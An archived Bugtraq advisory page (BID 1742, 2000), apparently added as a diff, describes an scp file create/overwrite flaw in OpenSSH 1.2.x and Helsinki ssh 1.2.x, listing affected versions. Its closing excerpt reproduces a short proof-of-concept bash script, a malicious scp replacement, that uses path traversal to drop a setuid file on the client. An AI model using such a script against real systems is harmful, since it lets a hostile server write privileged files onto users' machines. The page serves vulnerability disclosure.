@@ -1,0 +1,187 @@
+#bid1742<p><b><span style="font-size: 18pt;">scp File Create/Overwrite Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/1742/info">info</a><br><a href="http://www.securityfocus.com/bid/1742/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/1742/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/1742/solution">solution</a><br><a href="http://www.securityfocus.com/bid/1742/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				1742
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Design Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Sep 30 2000 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Sep 30 2000 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This vulnerability was reported to bugtraq by Michal Zalewski &lt;lcamtuf@tpi.pl&gt; on Sat, 30 Sep 2000.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					OpenBSD OpenSSH 1.2.3 <br/>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.2  sparc<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.2  powerpc<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.2  arm<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.2  alpha<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.2  68k<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.2 <br/>
+</span>
+					
+				
+					OpenBSD OpenSSH 1.2 <br/>
+					
+				
+					Helsinki University of Technology ssh 1.2.27 <br/>
+					
+				
+					Helsinki University of Technology ssh 1.2.26 <br/>
+					
+				
+					Helsinki University of Technology ssh 1.2.25 <br/>
+					
+				
+					Helsinki University of Technology ssh 1.2.24 <br/>
+					
+				
+					Helsinki University of Technology ssh 1.2.23 <br/>
+					
+				
+					Helsinki University of Technology ssh 1.2.22 <br/>
+					
+				
+					Helsinki University of Technology ssh 1.2.21 <br/>
+					
+				
+					Helsinki University of Technology ssh 1.2.20 <br/>
+					
+				
+					Helsinki University of Technology ssh 1.2.19 <br/>
+					
+				
+					Helsinki University of Technology ssh 1.2.18 <br/>
+					
+				
+					Helsinki University of Technology ssh 1.2.17 <br/>
+					
+				
+					Helsinki University of Technology ssh 1.2.16 <br/>
+					
+				
+					Helsinki University of Technology ssh 1.2.15 <br/>
+					
+				
+					Helsinki University of Technology ssh 1.2.14 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					OpenBSD OpenSSH 2.1.1 <br/>
+					
+				
+					OpenBSD OpenSSH 2.1 <br/>
+					
+				
+					Helsinki University of Technology ssh 2.1 <br/>
+					
+				
+					Helsinki University of Technology ssh 2.0 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Excerpted from original bugtraq posting by Michal Zalewski &lt;lcamtuf@tpi.pl&gt;<br/>---<br/>As a proof of concept, I created trivial scp replacement (put it on remote machine in the place of original scp binary - usually in /usr/local/bin).<br/><br/>It will try to exploit any file transfer, creating setuid /tmp/ScpIsBuggy file on client system:<br/><br/>#!/bin/bash<br/><br/>echo "D0755 0 ../../../../../../tmp/nope"<br/>echo "D0755 0 ../../../../../../tmp"<br/>echo "C4755 200 ScpIsBuggy"<br/>dd if=/dev/urandom of=/dev/stdout bs=200 count=1 2&gt;/dev/null<br/>dd if=/dev/zero of=/dev/stdout bs=1 count=2 2&gt;/dev/null<br/>---
+	
+		<ul>
+</ul>
+</div>
